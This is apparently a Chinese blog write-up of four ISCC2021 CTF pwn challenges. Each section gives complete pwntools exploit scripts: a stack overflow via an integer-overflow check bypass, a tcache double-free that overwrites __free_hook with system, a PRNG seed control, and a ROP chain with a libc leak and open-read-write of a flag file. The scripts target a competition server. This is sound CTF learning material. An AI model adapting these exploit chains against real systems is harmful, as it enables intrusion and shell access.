---
title:  ISCC2021 PWN部分 WP
categories: [CTF]
tags: [wp,pwn]

---
今年终于有机会去体验iscc了，也感受到了什么是pycc的力量了。（人均全栈，233雾）<!--more-->

## M78

经典的整数溢出与栈溢出.利用262来整数逃过判断,扩大栈上写入字节造成栈溢出.

```python
from pwn import *

e=ELF('./M78')

p=remote('39.96.88.40',7010)
p.sendline('1\x00')
p.recvuntil('Please choose a building')


p.recvuntil('Please input the password')

shell='a'*(0x18+4)+p32(e.symbols['call_main'])

p.sendline(shell+'a'*(262-len(shell)))
#gdb.attach(p)
p.interactive()
```



## Box

old-2.27版的堆题,限制了最多申请6个同种堆块,通过连续二次释放0x90大小的堆块.获得chunk地址.更改tcache 管理结构体,伪造其填满.再释放0x90大小的堆块获得libc基地址.再在`__free_hook`上写入system 从而getshel。l

```python
from pwn import *

e=ELF('./pwn')
l=ELF('./libc.so.6')
#l=ELF('/glibc/2.27/amd64/lib/libc.so.6')
#p=process('./pwn')
p=remote('39.96.88.40',7020)

def add(num,size,text):
	#p.recvuntil('>> ')
	p.sendline('1')
	p.recvuntil('Input the index:')
	p.sendline(str(num))
	p.recvuntil('Input the size:')
	p.sendline(str(size))
	p.recvuntil('Input data:')
	p.sendline(text)
def edit(num,text):
	p.send('2')
	p.recvuntil('Input the index:')
	p.sendline(str(num))
	p.recvuntil('Please input the data:')
	p.send(text)
	
def free(num):
	p.sendline('3')
	p.recvuntil('Input the index:')
	p.sendline(str(num))

def show(num):
	p.sendline('4')
	p.recvuntil('Input the index:')
	p.sendline(str(num))
	p.recvuntil('Here is it :')


add(1,0x90,'111')
add(2,0x90,'111')
add(0,0x90,'/bin/sh\x00')
sleep(0.1)
free(1)
sleep(0.1)
free(2)
sleep(0.1)
show(2)

chunk_addr=u64(p.recv(6).ljust(8,'\x00'))
log.info('chunk_addr:'+hex(chunk_addr))
tache_addr=chunk_addr-0x260
log.info('tache_addr:'+hex(tache_addr))
edit(2,p64(tache_addr+0x10))

#add(2,0x40,p8(7)*0x10)
add(3,0x90,p8(7)*0x10)
sleep(0.1)
add(4,0x90,p8(6)*0x40)
#gdb.attach(p)
sleep(0.1)
free(0)
sleep(0.1)
free(3)
sleep(0.1)
show(3)
main_arena_addr=u64(p.recv(6).ljust(8,'\x00'))-96
log.info('main_arena_addr:'+hex(main_arena_addr))
base=main_arena_addr-0x3afc40
log.info('blic_base_addr:'+hex(base))
sleep(0.1)
edit(4,p8(6)*0x40+p64(base+l.symbols['__free_hook'])+p64(base+l.symbols['__free_hook']))
sleep(0.1)
add(5,0x20,p64(base+l.symbols['system']))
#p.interactive()
edit(4,'/bin/sh\x00')
free(4)



p.interactive()
```

## game

经典的伪随机数问题，通过`from ctypes import *`的`CDLL`本地模拟随机数生成，同时利用栈溢出控制伪随机数种子。从而控制随机数产生。

```python
from pwn import *
from ctypes import *
e=ELF('./game')
context.log_level = 'debug'
p=remote('39.96.88.40',7040)
#process('./game')
c = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
c.srand(1) 
pay='a'*(0x24)+p32(2)+p32(1)

p.send(pay)

#gdb.attach(p)

for i in range(10):
    #p.recvuntil('point(1~6):')
	x=c.rand()
	#print(x)
	c.srand(x)
	l=c.rand()%0x64+1 
	print(l)
	#p.interactive()
	p.sendline(str(l))
	#print(l)
	print(p.recv())
p.interactive()
```

## full

由于没有打印信息的函数,且程序PIE是关闭的,通常就会想到ret2dl_resolve。但是做了半天发现不行，看了下保护：

```python
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

发现 `Full RELRO`开着，wro......

但是查阅资料发现[神奇的gadget](https://gdufs-king.github.io/2020/01/03/%E7%A5%9E%E5%A5%87%E7%9A%84gadget/)一文提供了，将真实地址转移到栈上修改的思路。虽然题目中没有这个gadget但是提供了memcpy 函数。

有根据在大多数libc中read与write的symbols只一个字节不同的特性，同过将read打印到栈上修改成write从而泄露libc。

然后不知道为啥system无法执行（菜鸡推测是栈上问题），于是用orw（open-read-write）方法强行读取flag文件

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.arch='i386'

elf=ELF('./full')

#p=remote('39.96.88.40',7050)
p=process('./full')
pppr_addr      = 0x08048519     # pop esi ; pop edi ; pop ebp ; ret
pop_ebp_addr   = 0x0804851b     # pop ebp ; ret
leave_ret_addr = 0x080483c5     # leave ; ret



pay1='12cdefghijklmn'+p32(0x0804A040+0x10+0x8)+p8(1)*2
pay1+=p32(elf.symbols['read'])+p32(pppr_addr)+p32(0)+p32(0x804a240)+p32(0x100)
pay1+=p32(elf.symbols["memcpy"])+p32(pppr_addr)+p32(0x804a260)+p32(0x8049ff0)+p32(4)
#栈转移

pay1+=p32(elf.symbols['read'])+p32(pppr_addr)+p32(0)+p32(0x804a260)+p32(0x1)
pay1+=p32(0x08048518)+p32(0x804a260)+p32(0x41)+p32(0x40)+p32(0x804a260)+p32(0x08048504)+p32(1)+p32(0x804a260)+p32(8)+'1111'*4+'2222'*4
pay1+=p32(elf.symbols['read'])+p32(pppr_addr)+p32(0)+p32(168+0x0804A040)+p32(0x100)
print(len(pay1))#布局gadget，ret2csu调用write打印真实地址

p.sendline(pay1)
sleep(1)
p.sendline('/flag.txt\x00\x00')
sleep(1)
#gdb.attach(p)
p.send(p8(0xb0))# yuancheng  #经过爆破发现将read真实地址改为0xb0恰好是write

#p.send(p8(0x90)) #本地



write=u32(p.recv(4))
print(hex(write))
libc = LibcSearcher('write', write)
libcbase = write - libc.dump('write')
log.info('base:'+hex(libcbase))

system=libcbase+libc.dump('system')
read_0=libcbase+libc.dump('open')
write_0=libcbase+libc.dump('write')
log.info('libcbase+system:'+hex(system))
binsh_addr = libcbase + libc.dump('str_bin_sh')
#gdb.attach(p)
p.sendline(p32(read_0)+p32(pppr_addr)+p32(0x804a240)+p32(0)+p32(0)+p32(elf.symbols['read'])+p32(pppr_addr)+p32(3)+p32(0x804a440+4)+p32(0x100)+p32(write_0)+'xxxx'+p32(1)+p32(0x804a440+4)+p32(0x100))#orw操作
#p.sendline()
#gdb.attach(p)
#p.sendline(p32(elf.symbols['read'])+'aaaa'+p32(0)+p32(0x804a240)+p32(0x100))
p.interactive()
```

